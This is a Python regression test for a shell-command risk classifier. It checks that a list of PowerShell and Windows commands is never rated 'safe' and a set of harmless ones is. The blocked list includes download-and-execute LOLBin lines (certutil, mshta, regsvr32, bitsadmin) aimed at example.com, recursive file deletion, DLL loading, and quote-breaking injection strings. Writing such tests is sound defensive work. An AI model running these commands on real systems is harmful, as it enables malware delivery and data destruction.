"""Commands that must never be rated read-only ('safe'), because read-only commands may run without a click.

  python tests/risk_bypass.py

Covers the bypasses from the October 2026 security review (finding S1) and a few close relatives.
"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from core.shell import shell  # noqa: E402

MUST_NOT_BE_SAFE = [
    r"Get-ChildItem $HOME\Documents -Recurse -File | ForEach-Object Delete",
    r"Get-ChildItem $HOME\Documents -Recurse -File | % Delete",
    r"Get-ChildItem $HOME\Documents -File | ForEach-Object -MemberName Delete",
    r"Get-Process notepad | % Kill",
    r"Get-Process notepad | ForEach-Object -MemberName CloseMainWindow",
    r"Add-Type -TypeDefinition 'public class X { }'",
    r"Add-Type -Path C:\temp\evil.dll",
    r"Invoke-Item C:\temp\evil.exe",
    r"Import-Module C:\temp\evil.psm1",
    r"Import-Clixml C:\temp\data.xml",
    r"curl -o $env:TEMP\x.exe https://example.com/x.exe",
    r"certutil -urlcache -split -f https://example.com/x.exe x.exe",
    r"certutil -decode in.b64 out.exe",
    r"wmic process call create calc.exe",
    r"mshta https://example.com/x.hta",
    r"rundll32 javascript:alert(1)",
    r"regsvr32 /s /u /i:https://example.com/x.sct scrobj.dll",
    r"bitsadmin /transfer j https://example.com/x.exe C:\temp\x.exe",
    r"[scriptblock]::Create('Remove-Item C:\temp -Recurse').Invoke()",
    r"$sb = [scriptblock]::Create('calc'); & $sb",
    r"Invoke-Command -ScriptBlock { calc }",
    r"(New-Object -ComObject Shell.Application).ShellExecute('calc.exe')",
    r"(New-Object -ComObject WScript.Shell).Run('calc')",
    r"[Diagnostics.Process]::Start('calc')",
    r"[Activator]::CreateInstance([type]::GetTypeFromProgID('WScript.Shell')).Run('calc')",
    r"[Reflection.Assembly]::LoadFile('C:\temp\evil.dll')",
    r"[Environment]::SetEnvironmentVariable('Path', '', 'User')",
    r"[System.Windows.Forms.Application]::SetSuspendState('Suspend', $false, $false)",
    r"(Get-Item C:\temp\a.txt).MoveTo('C:\temp\b.txt')",
    r"(Get-Item C:\temp\a.txt).Delete()",
    r"Get-ChildItem C:\temp | Out-File C:\temp\list.txt",
    r"Get-Date > C:\temp\now.txt",
    r"Invoke-Expression 'calc'",
    r"Get-ChildItem | Remove-Item",
]
MUST_BE_SAFE = [
    r"Get-Process | Sort-Object CPU -Descending | Select-Object -First 5",
    r"Get-ChildItem | ForEach-Object Name",
    r"Get-ChildItem | ForEach-Object { $_.Name.ToUpper() }",
    r"Import-Csv C:\temp\a.csv | Format-Table",
    r"Add-Type -AssemblyName System.Windows.Forms",
    r"[math]::Round(2.5)",
    r"[datetime]::Now.AddDays(-1)",
    r"certutil -hashfile C:\Windows\notepad.exe SHA256",
    r"'{0:N1}' -f [math]::Pi",
]


INJECT = ["Bob’s file", "x’; calc; ’", "x'; calc; '", "x”; calc; “", 'x"; calc; "', "a`b$c"]


def check_quotes():
    """Text slots must stay one string, even with typographic quotes (finding S5)."""
    from core import slots
    bad = 0
    for text in INJECT:
        for template in ("Write-Output '{{text}}'", 'Write-Output "{{text}}"'):
            quote = template[13]
            code = template.replace("{{text}}", slots.render(text, "text", None, quote))
            v = shell.verify(code)
            names = [c["name"] for c in v["commands"]]
            ok = names == ["Write-Output"] and not v["syntax"]
            bad += not ok
            print(f"{'ok  ' if ok else 'FAIL'} quotes  {code}  -> {names}")
    return bad


def main():
    shell.start()
    bad = check_quotes()
    for code in MUST_NOT_BE_SAFE:
        v = shell.verify(code)
        ok = v["risk"] != "safe"
        bad += not ok
        print(f"{'ok  ' if ok else 'FAIL'} {v['risk']:8} {code[:90]}")
    for code in MUST_BE_SAFE:
        v = shell.verify(code)
        ok = v["risk"] == "safe"
        bad += not ok
        print(f"{'ok  ' if ok else 'FAIL'} {v['risk']:8} {code[:90]}  {'; '.join(v.get('reasons') or []) if not ok else ''}")
    shell.shutdown()
    print(f"\n{len(MUST_NOT_BE_SAFE) + len(MUST_BE_SAFE)} checks, {bad} failed")
    sys.exit(1 if bad else 0)


if __name__ == "__main__":
    main()
